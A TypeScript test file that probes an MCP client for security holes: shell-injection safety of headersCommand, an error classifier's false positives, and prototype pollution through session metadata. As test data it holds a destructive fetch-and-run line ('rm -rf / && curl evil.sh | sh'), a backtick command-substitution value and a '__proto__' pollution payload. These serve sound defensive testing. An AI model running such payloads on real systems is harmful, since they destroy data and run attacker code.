/**
 * Adversarial tests for v0.9.1.
 *
 * Shipping changes since v0.8.10 covered here:
 *   - #793 headersCommand: dynamic header resolution via execFile (no shell).
 *     Adversarial focus: shell-metacharacter argv is passed literally (no
 *     injection surface), and malformed shapes are rejected loudly by the
 *     config schema instead of silently no-oping.
 *   - MCP catalog tolerant-retry gate (isAnnotationHintValidationError in
 *     src/mcp/catalog.ts): the message-substring classifier that decides
 *     whether to retry tools/list with the lenient Fabric-tolerant schema.
 *     Adversarial focus: false-positive resistance — does an error that merely
 *     *mentions* the trigger words (without structurally being that error)
 *     get misclassified?
 *   - #968 telemetry `source`: session.metadata is an open `Record<string,
 *     unknown>` client-supplied bag consumed by session_start telemetry via a
 *     `typeof === "string"` guard. Adversarial focus: hostile metadata
 *     (wrong types, deep nesting, prototype-pollution-shaped keys) must not
 *     crash session creation or leak into Object.prototype.
 *
 * Determinism: no timing deps, no shared mutable state between tests, no
 * network (execFile only spawns local /bin/echo-class binaries already used
 * elsewhere in the MCP test suite). No mock.module().
 */

import { describe, test, expect } from "bun:test"
import { Effect, Schema } from "effect"
import type { Client } from "@modelcontextprotocol/sdk/client/index.js"
import { ConfigMCPV1 } from "@opencode-ai/core/v1/config/mcp"
import { McpCatalog } from "../../src/mcp/catalog"
import { Session } from "../../src/session"
import { Instance } from "../../src/project/instance"
import { tmpdir } from "../fixture/fixture"

// ---------------------------------------------------------------------------
// 1. headersCommand (#793) — shell-injection safety + shape validation.
// ---------------------------------------------------------------------------
describe("headersCommand (#793): shell-injection safety", () => {
  test("argv containing shell metacharacters (; && |) is passed literally to execFile, never shell-interpreted", async () => {
    const { MCP } = await import("../../src/mcp")
    // If execFile ever routed this through a shell, `;`, `&&`, and `|` would be
    // parsed as command separators/pipes and this test would either throw
    // (curl/sh not mocked) or echo something other than the literal string.
    // execFile passes argv straight to the OS with no shell, so `echo` receives
    // the whole string as ONE argument and prints it back unchanged.
    const result = await MCP._testing.resolveHeadersCommand({
      Authorization: ["echo", "; rm -rf / && curl evil.sh | sh #"],
    })
    expect(result.Authorization).toBe("; rm -rf / && curl evil.sh | sh #")
  })

  test("argv containing a literal command-substitution payload is echoed back unevaluated", async () => {
    const { MCP } = await import("../../src/mcp")
    const result = await MCP._testing.resolveHeadersCommand({
      Token: ["echo", "`id`"],
    })
    // A shell would expand `id` via backticks; execFile treats it as inert text.
    expect(result.Token).toBe("`id`")
  })
})

describe("headersCommand (#793): ConfigMCPV1.Remote schema rejects malformed shapes", () => {
  test("rejects empty argv (would silently no-op at runtime)", () => {
    expect(() =>
      Schema.decodeUnknownSync(ConfigMCPV1.Remote)({
        type: "remote",
        url: "https://example.com/mcp",
        headersCommand: { Authorization: [] },
      }),
    ).toThrow()
  })

  test("rejects a string value in place of an argv array", () => {
    // A user might paste a shell one-liner directly as the value, expecting it
    // to be split/run as a command — the schema must reject this loudly rather
    // than silently treating the string as a 1-character-per-index array or
    // similarly nonsensical coercion.
    expect(() =>
      Schema.decodeUnknownSync(ConfigMCPV1.Remote)({
        type: "remote",
        url: "https://example.com/mcp",
        headersCommand: { Authorization: "az account get-access-token" },
      }),
    ).toThrow()
  })

  test("rejects an array-of-arrays value (nested argv is not a valid argv of strings)", () => {
    expect(() =>
      Schema.decodeUnknownSync(ConfigMCPV1.Remote)({
        type: "remote",
        url: "https://example.com/mcp",
        headersCommand: { Authorization: [["az", "account", "get-access-token"]] },
      }),
    ).toThrow()
  })

  test("rejects a top-level array in place of a header-name-keyed record", () => {
    expect(() =>
      Schema.decodeUnknownSync(ConfigMCPV1.Remote)({
        type: "remote",
        url: "https://example.com/mcp",
        headersCommand: [["az", "account", "get-access-token"]],
      }),
    ).toThrow()
  })
})

// ---------------------------------------------------------------------------
// 2. MCP catalog tolerant-retry gate — false-positive resistance.
//
// isAnnotationHintValidationError (src/mcp/catalog.ts) classifies an error as
// "Fabric-style null-annotation validation error" (and retries tools/list with
// the lenient schema) only when a hint name appears as a path segment
// immediately after `annotations` INSIDE a serialized Zod `"path"` array, i.e.
// `"path":[...,"annotations","<hint>"]`. Loose substring co-occurrence of the
// trigger words elsewhere in the message must NOT fire the retry. That
// structural-vs-coincidental boundary is the adversarial surface probed below.
// ---------------------------------------------------------------------------
describe("McpCatalog tolerant-retry gate: false-positive resistance", () => {
  function fakeClientThrowing(message: string, requestFlag: { called: boolean }) {
    return {
      listTools: async () => {
        throw new Error(message)
      },
      request: async () => {
        requestFlag.called = true
        return { tools: [{ name: "should_not_normally_appear", inputSchema: { type: "object" } }] }
      },
    } as unknown as Client
  }

  test("does NOT retry for an unrelated field's validation error even when the hint words co-occur as prose", async () => {
    // Adversarial construction: a genuine Zod issue array for a completely
    // unrelated field (`tools[0].description`), with the trigger words
    // "annotations"/"readOnlyHint" appended as trailing prose (e.g. from a server
    // that also logs a deprecation notice in the same error text). The classifier
    // requires the hint to sit *immediately after* `annotations` inside a `"path"`
    // array — prose co-occurrence does not satisfy that — so this unrelated
    // "description" error is correctly NOT masked behind the annotation fallback.
    const message =
      JSON.stringify([
        { code: "invalid_type", expected: "string", path: ["tools", 0, "description"], message: "Invalid input" },
      ]) + " (server notice: annotations.readOnlyHint field is deprecated)"
    const flag = { called: false }
    const result = await Effect.runPromise(McpCatalog.defs(fakeClientThrowing(message, flag), 1_000))
    expect(flag.called).toBe(false)
    expect(result).toBeUndefined()
  })

  test("genuine Fabric-style null-annotation error (openWorldHint) retries and returns the tool", async () => {
    const message = JSON.stringify([
      {
        code: "invalid_type",
        expected: "boolean",
        path: ["tools", 0, "annotations", "openWorldHint"],
        message: "Invalid input",
      },
    ])
    const flag = { called: false }
    const result = await Effect.runPromise(McpCatalog.defs(fakeClientThrowing(message, flag), 1_000))
    expect(flag.called).toBe(true)
    expect(result).toHaveLength(1)
    expect(result?.[0]?.name).toBe("should_not_normally_appear")
  })

  test("does not retry when 'path' appears only as a substring of another word (no exact `\"path\"` token)", async () => {
    // Negative control proving the literal-quote match is exact: a key named
    // "somepath" contains the letters p-a-t-h but not the quoted token `"path"`
    // that the classifier requires, so this must NOT be misclassified even
    // though "annotations" and a hint name are both present.
    const message = JSON.stringify([
      { code: "invalid_type", somepath: ["tools", 0, "annotations", "readOnlyHint"], message: "Invalid input" },
    ])
    const flag = { called: false }
    const result = await Effect.runPromise(McpCatalog.defs(fakeClientThrowing(message, flag), 1_000))
    expect(flag.called).toBe(false)
    expect(result).toBeUndefined()
  })

  // NOTE: a "prototype-pollution-ish key" sub-case (e.g. a `__proto__` segment
  // in the error message) was considered but skipped as a fabricated test:
  // isAnnotationHintValidationError never JSON.parses the error message — it
  // only runs `.test()` regexes against the raw string — so a `__proto__`
  // substring has no special meaning here and can't pollute anything. The
  // real prototype-pollution-relevant surface in this release is
  // session.metadata (untrusted, deserialized client JSON), covered in
  // section 3 below.
})

// ---------------------------------------------------------------------------
// 3. Telemetry `source` (#968) — hostile session.metadata.
//
// session.metadata is `Record<string, unknown>`, client-supplied via POST
// /session, and session_start telemetry reads `session.metadata?.source`
// through a `typeof === "string"` guard (src/session/prompt.ts). These tests
// exercise the real Session.create() path (schema validation + DB round-trip)
// with hostile metadata shapes and confirm neither a crash nor prototype
// pollution occurs.
// ---------------------------------------------------------------------------
describe("Session.create() (#968): hostile metadata does not crash or pollute", () => {
  test("non-string source (number) round-trips without throwing; typeof guard would correctly reject it", async () => {
    await using tmp = await tmpdir()
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const session = await Session.create({ metadata: { source: 123 } })
        expect(session.metadata?.source).toBe(123)
        expect(typeof session.metadata?.source).not.toBe("string")
      },
    })
  })

  test("null source round-trips without throwing; typeof guard would correctly reject it", async () => {
    await using tmp = await tmpdir()
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const session = await Session.create({ metadata: { source: null } })
        expect(session.metadata?.source).toBe(null)
        expect(typeof session.metadata?.source).not.toBe("string")
      },
    })
  })

  test("deeply nested metadata survives the schema + DB round-trip intact", async () => {
    await using tmp = await tmpdir()
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const nested = { source: "poweruser", extra: { a: { b: { c: [1, 2, { d: "deep" }] } } } }
        const session = await Session.create({ metadata: nested })
        expect(session.metadata).toEqual(nested)
      },
    })
  })

  test("a JSON-parsed `__proto__` own-property in metadata does not pollute Object.prototype", async () => {
    await using tmp = await tmpdir()
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        // Simulates the realistic attack path: an HTTP JSON body parsed into a
        // plain object has `__proto__` as a genuine own enumerable property
        // (JSON.parse never triggers the object-literal special case), which is
        // exactly what a malicious POST /session body would produce.
        const malicious = JSON.parse('{"__proto__":{"polluted":true},"source":"evil"}')
        const session = await Session.create({ metadata: malicious })
        expect((Object.prototype as Record<string, unknown>).polluted).toBeUndefined()
        expect(({} as Record<string, unknown>).polluted).toBeUndefined()
        // The legitimate sibling key must still survive the round-trip.
        expect(session.metadata?.source).toBe("evil")
      },
    })
  })
})
